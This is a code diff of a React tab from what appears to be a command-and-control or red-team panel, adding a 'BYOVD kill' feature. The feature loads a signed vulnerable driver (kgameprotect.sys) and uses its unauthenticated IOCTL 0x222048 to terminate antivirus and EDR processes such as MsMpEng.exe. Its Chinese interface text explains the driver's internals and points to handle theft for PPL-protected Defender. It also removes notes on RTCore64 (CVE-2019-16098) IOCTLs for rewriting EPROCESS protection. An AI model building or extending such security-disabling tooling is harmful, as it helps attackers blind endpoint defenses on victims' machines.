@@ -1,4 +1,4 @@
-import { useState, useEffect, useRef, useMemo } from 'react'
+import { useState, useEffect, useRef, useMemo, type CSSProperties } from 'react'
 import { RefreshCw, Copy, ShieldCheck, ShieldAlert, EyeOff, Skull, Package } from 'lucide-react'
 import { sessionApi, driversApi } from '../api'
 import type { Session } from '../types'
@@ -41,7 +41,32 @@ export function AVDetectTab({ session }: { session: Session }) {
   const [byovdFile, setByovdFile] = useState('')
   const [builtinDrivers, setBuiltinDrivers] = useState<BuiltinDriver[]>([])
   const [builtinLoading, setBuiltinLoading] = useState('')
+  /** BYOVD 击杀目标：PID 或进程名 */
+  const [byovdKillTarget, setByovdKillTarget] = useState('')
+  /** BYOVD 击杀使用的内置驱动（默认取内置的 kill 用途驱动） */
+  const [byovdKillDriver, setByovdKillDriver] = useState('')
   const loadedRef = useRef(false)
+
+  /** 输入框样式（BYOVD 击杀/自定义驱动区复用） */
+  const inputStyle: CSSProperties = {
+    padding: '8px 10px',
+    borderRadius: 6,
+    border: '1px solid var(--border, #3a3a4a)',
+    background: 'var(--bg-elevated, #1e1e2a)',
+    color: 'var(--text, #e5e5ea)',
+    fontSize: 12,
+  }
+  /** 行内代码样式（设备名/IOCTL/哈希） */
+  const codeStyle: CSSProperties = {
+    fontFamily: 'var(--mono, monospace)',
+    fontSize: 11,
+    padding: '1px 5px',
+    margin: '0 2px',
+    borderRadius: 3,
+    background: 'var(--bg-elevated, #1e1e2a)',
+    border: '1px solid var(--border, #3a3a4a)',
+    color: 'var(--text, #e5e5ea)',
+  }
 
   const pollTask = async (taskId: number): Promise<{ status: string; output: string } | null> => {
     const intervals = [0, 200, 300, 500, 1000, 2000]
@@ -207,6 +232,21 @@ export function AVDetectTab({ session }: { session: Session }) {
     return r.data?.task_id
   })
 
+  /** BYOVD 击杀：优先用内置 kgameprotect 驱动（无鉴权进程终止 IOCTL） */
+  const byovdKill = () => runTask(async () => {
+    const target = byovdKillTarget.trim()
+    if (!target) {
+      setEdrMsg('请填写要击杀的 PID 或进程名（如 MsMpEng.exe）')
+      return undefined
+    }
+    const isPID = /^\d+$/.test(target)
+    const payload = isPID
+      ? { pid: Number(target), driver: byovdKillDriver || undefined }
+      : { process_name: target, driver: byovdKillDriver || undefined }
+    const r = await sessionApi.byovdKill(session.id, payload)
+    return r.data?.task_id
+  })
+
   const pplKill = () => runTask(async () => {
     const names = edrProcesses.split(',').map(s => s.trim()).filter(Boolean)
     const r = await sessionApi.pplKill(session.id, names.length ? names : undefined)
@@ -330,39 +370,87 @@ export function AVDetectTab({ session }: { session: Session }) {
         )}
       </div>
 
-      {/* BYOVD 驱动加载 */}
+      {/* BYOVD 驱动：加载 + 进程击杀 */}
       <div style={{ marginTop: 18, borderTop: '1px solid var(--border, #3a3a4a)', paddingTop: 14 }}>
-        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
           <Skull size={16} color="#ff6b6b" />
-          <span style={{ fontWeight: 600, fontSize: 14 }}>BYOVD 驱动（内核级击杀前置）</span>
+          <span style={{ fontWeight: 600, fontSize: 14 }}>BYOVD 驱动（内核级击杀）</span>
+          <span style={{ fontSize: 11, color: 'var(--text-dim, #9a9aab)' }}>仅授权测试环境使用</span>
         </div>
-        <p style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', margin: '0 0 10px', lineHeight: 1.7 }}>
-          先加载内置的 RTCore64 驱动（MSI Afterburner，CVE-2019-16098），随后「PPL 击杀」走内核虚拟地址路线：
-          NtQuerySystemInformation 定位 EPROCESS 后，用驱动 IOCTL 0x80002068/0x8000206C 直接读改写 Protection（无物理扫描，无蓝屏风险）。
-          <br />EPROCESS 偏移已按 Windows 版本自动选择（RtlGetVersion，24H2+ 结构大改已适配），执行结果会打印命中的 EPROCESS 地址与 Protection 值。
-          <br />（实验性：偏移数据来自公开研究，需实机验证。内置驱动为原厂签名二进制，SHA-256 已核对；dbutil_2_3 被黑名单/杀软重点标记，不再内置，如需可自行上传）
-        </p>
-        {/* 内置驱动一键加载 */}
-        {builtinDrivers.length > 0 && (
-          <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap', marginBottom: 10 }}>
-            <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', display: 'inline-flex', alignItems: 'center', gap: 4 }}>
-              <Package size={13} /> 内置驱动（一键加载）：
-            </span>
-            {builtinDrivers.map(d => (
-              <button
-                key={d.name}
-                className="btn-small"
-                onClick={() => loadBuiltinDriver(d)}
-                disabled={edrBusy || builtinLoading !== ''}
-                title={`${d.description}\n设备: ${d.device}\nSHA256: ${d.sha256}`}
-                style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}
-              >
-                <Skull size={13} />
-                {builtinLoading === d.name ? '加载中...' : d.name}
-              </button>
-            ))}
+
+        <div style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', lineHeight: 1.8, marginBottom: 12 }}>
+          <div>
+            内置驱动 <code style={codeStyle}>kgameprotect.sys</code>（WHQL 签名，AMD64）：设备
+            <code style={codeStyle}>\\.\kgameprotect</code>，暴露一个**无鉴权进程终止 IOCTL**
+            <code style={codeStyle}>0x222048</code>（METHOD_BUFFERED / FILE_ANY_ACCESS，入参首个 DWORD = PID）。
+            驱动内部直接 <code style={codeStyle}>PsLookupProcessByProcessId → ObOpenObjectByPointer(PROCESS_TERMINATE) → ZwTerminateProcess</code>，
+            因此**不需要调用方持有目标进程的 PROCESS_TERMINATE 权限**，可用于击杀普通杀软/EDR 进程。
           </div>
-        )}
+          <div style={{ marginTop: 6 }}>
+            限制：该驱动**只提供进程终止**，没有任意内核读写能力，因此**对 PPL 保护进程无效**（它拦不住内核句柄检查）；
+            PPL 保护进程（如 Defender 的 MsMpEng）请走上方「PPL 击杀」的**句柄窃取**路线。
+          </div>
+          <div style={{ marginTop: 6 }}>
+            SHA-256 <code style={codeStyle}>{builtinDrivers[0]?.sha256 || '6c1d596d18213e24f0c88d58ea7f3ca24114eded806b6198a8abc701251126ee'}</code>
+            （与 LOLDrivers PR #428 记录一致；可自行用 <code style={codeStyle}>signtool verify /pa</code> 复核签名）。
+            加载后记得「卸载驱动」清理内核服务与文件。
+          </div>
+        </div>
+
+        {/* 内置驱动一键加载 */}
+        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap', marginBottom: 12 }}>
+          <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', display: 'inline-flex', alignItems: 'center', gap: 4 }}>
+            <Package size={13} /> 内置驱动（一键加载）：
+          </span>
+          {builtinDrivers.length === 0 && (
+            <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>未读取到内置驱动列表</span>
+          )}
+          {builtinDrivers.map(d => (
+            <button
+              key={d.name}
+              className="btn-small"
+              onClick={() => loadBuiltinDriver(d)}
+              disabled={edrBusy || builtinLoading !== ''}
+              title={`${d.description}\n设备: ${d.device}  服务名: ${d.service}\n用途: ${d.purpose || 'kill'}\nIOCTL: ${d.ioctl !== undefined ? '0x' + d.ioctl.toString(16) : '-'}\nSHA256: ${d.sha256}`}
+              style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}
+            >
+              <Skull size={13} />
+              {builtinLoading === d.name ? '加载中...' : d.name}
+            </button>
+          ))}
+          <button className="btn-small" onClick={unloadDriver} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
+            卸载驱动
+          </button>
+        </div>
+
+        {/* 击杀进程 */}
+        <div style={{ padding: '10px 12px', border: '1px solid var(--border, #3a3a4a)', borderRadius: 6, background: 'var(--bg-deep, #12121a)', marginBottom: 12 }}>
+          <div style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', marginBottom: 8 }}>
+            击杀目标进程（PID 或进程名）：驱动加载后调用 IOCTL <code style={codeStyle}>0x222048</code> 终止目标
+          </div>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
+            <input
+              type="text"
+              value={byovdKillTarget}
+              onChange={(e) => setByovdKillTarget(e.target.value)}
+              placeholder="如 1234 或 MsMpEng.exe / 360tray.exe"
+              style={{ ...inputStyle, width: 240 }}
+            />
+            {builtinDrivers.length > 1 && (
+              <select value={byovdKillDriver} onChange={(e) => setByovdKillDriver(e.target.value)} style={{ ...inputStyle, width: 190 }}>
+                <option value="">默认驱动（{builtinDrivers[0]?.name}）</option>
+                {builtinDrivers.map(d => (
+                  <option key={d.name} value={d.name}>{d.name}</option>
+                ))}
+              </select>
+            )}
+            <button className="btn-small danger" onClick={byovdKill} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
+              <Skull size={13} /> 驱动击杀
+            </button>
+          </div>
+        </div>
+
+        {/* 自定义驱动上传 */}
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
           <label className="btn-small" style={{ display: 'inline-flex', alignItems: 'center', gap: 6, cursor: 'pointer' }}>
             选择 .sys 驱动
@@ -373,14 +461,11 @@ export function AVDetectTab({ session }: { session: Session }) {
             type="text"
             value={byovdSvc}
             onChange={(e) => setByovdSvc(e.target.value)}
-            placeholder="服务名（如 tsdrv）"
-            style={{ width: 140, padding: '8px 10px', borderRadius: 6, border: '1px solid var(--border, #3a3a4a)', background: 'var(--bg-elevated, #1e1e2a)', color: 'var(--text, #e5e5ea)', fontSize: 12 }}
+            placeholder="服务名（如 kgameprotect）"
+            style={{ width: 160, padding: '8px 10px', borderRadius: 6, border: '1px solid var(--border, #3a3a4a)', background: 'var(--bg-elevated, #1e1e2a)', color: 'var(--text, #e5e5ea)', fontSize: 12 }}
           />
           <button className="btn-primary" onClick={loadDriver} disabled={edrBusy || !byovdB64} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
             <Skull size={14} /> 加载驱动
-          </button>
-          <button className="btn-small" onClick={unloadDriver} disabled={edrBusy} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
-            卸载驱动
           </button>
         </div>
       </div>
